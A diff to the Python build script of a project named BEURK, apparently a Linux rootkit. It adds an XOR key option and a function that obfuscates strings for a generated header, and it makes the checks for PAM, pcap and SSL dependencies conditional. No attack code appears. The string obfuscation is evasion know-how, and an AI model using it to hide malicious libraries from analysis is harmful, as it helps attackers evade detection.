@@ -4,6 +4,23 @@ import sys, os
 import commands
 from pprint import pprint
 
+def help():
+    """display usage help message and exit
+    """
+    print("Usage: %s <config-file>" % sys.argv[0])
+    sys.exit(1)
+
+def abort(msg):
+    """abort builder with given error message
+    """
+    sys.exit("%s: *** %s ***" % (sys.argv[0], msg))
+
+if len(sys.argv) != 2:
+    help()
+
+
+###############################################################################
+### parse config file and beurk env vars
 
 # special types for config var values
 def type_str(v):
@@ -17,6 +34,11 @@ def type_bool(v):
 def type_int(v):
     return int(v)
 
+def type_hexbyte(v):
+    v = int(v, 16)
+    assert -1 < v < 0x100
+    return v
+
 # the list of config keys (with their associated expected type)
 CONFIG_KEYS = {
         "LIBRARY_NAME": type_str,
@@ -26,15 +48,8 @@ CONFIG_KEYS = {
         "ENABLE_PCAP": type_bool,
         "ENABLE_SSL": type_bool,
         "CC": type_str,
+        "XOR_KEY": type_hexbyte,
         }
-
-
-def help():
-    """display usage help message and exit
-    """
-    print("Usage: %s <config-file>" % sys.argv[0])
-    sys.exit(1)
-
 
 def get_config(lines, check_missing_vars=True):
     result = {}
@@ -61,38 +76,7 @@ def get_config(lines, check_missing_vars=True):
         for expected_key in CONFIG_KEYS.keys():
             if expected_key not in result.keys():
                 raise SyntaxError("key %r is not defined" % expected_key)
-
     return result
-
-
-def check_lib_dependencies():
-    """test current system for BEURK dependencies
-    """
-    deps = {"libpam": "security/pam_appl.h",
-            "libssl": "openssl/sha.h",
-            "libpcap": "pcap/pcap.h"}
-    include_path = [
-            "/usr/include",
-            "/usr/local/include"]
-    missing_deps = 0
-
-    for dep, header in deps.items():
-        for include_dir in include_path:
-            header_path = os.path.join(include_dir, header)
-            if os.path.isfile(header_path):
-                break
-        else:
-            msg = "Dependency not satisfied: %s-dev (header files)."
-            sys.stderr.write("%s\n" % msg % dependency)
-            missing_deps += 1
-    return False if missing_deps else True
-
-
-###############################################################################
-### parse arguments
-
-if len(sys.argv) < 2:
-    help()
 
 # read config file
 try:
@@ -118,12 +102,69 @@ for key, val in os.environ.items():
 
 
 ###############################################################################
-### compile library
+### chdir to project's root
 
-# chdir to project root directory
 ret, out = commands.getstatusoutput("git rev-parse --show-toplevel")
 if ret == 0:
     os.chdir(out.strip())
+
+
+###############################################################################
+### generate config.h
+
+def xor(string):
+    """xor (obfuscate) given string with XOR_KEY config var
+    """
+    key = config["XOR_KEY"]
+    result = ""
+    for char in string:
+        result += "\\x" + hex(ord(char) ^ key)[2:]
+    return result
+
+
+
+
+###############################################################################
+### check dependencies
+
+def check_lib_dependencies(*checklibs):
+    """test current system for BEURK dependencies
+    """
+    deps = {"libpam": "security/pam_appl.h",
+            "libssl": "openssl/sha.h",
+            "libpcap": "pcap/pcap.h"}
+    include_path = [
+            "/usr/include",
+            "/usr/local/include"]
+    missing_deps = 0
+
+    for dep, header in deps.items():
+        if dep not in checklibs:
+            continue
+        for include_dir in include_path:
+            header_path = os.path.join(include_dir, header)
+            if os.path.isfile(header_path):
+                break
+        else:
+            msg = "Dependency not satisfied: %s-dev (header files)."
+            sys.stderr.write("%s\n" % msg % dep)
+            missing_deps += 1
+    return False if missing_deps else True
+
+checklibs = []
+if config["ENABLE_PCAP"]:
+    checklibs.append("libpcap")
+if config["ENABLE_PAM"]:
+    checklibs.append("libpam")
+if config["ENABLE_SSL"]:
+    checklibs.append("libssl")
+
+if not check_lib_dependencies(*checklibs):
+    abort("missing dependencies")
+
+
+###############################################################################
+### compile library
 
 def run_build_command(cmd):
     """function which runs a build shell command
@@ -131,7 +172,7 @@ def run_build_command(cmd):
     cmd = cmd.format(**config)
     print(cmd)
     if os.system(cmd) != 0:
-        sys.exit("%s: *** build command failed ***" % sys.argv[0])
+        abort("build command failed")
 
 SOURCES = [
         "src/beurk.c",
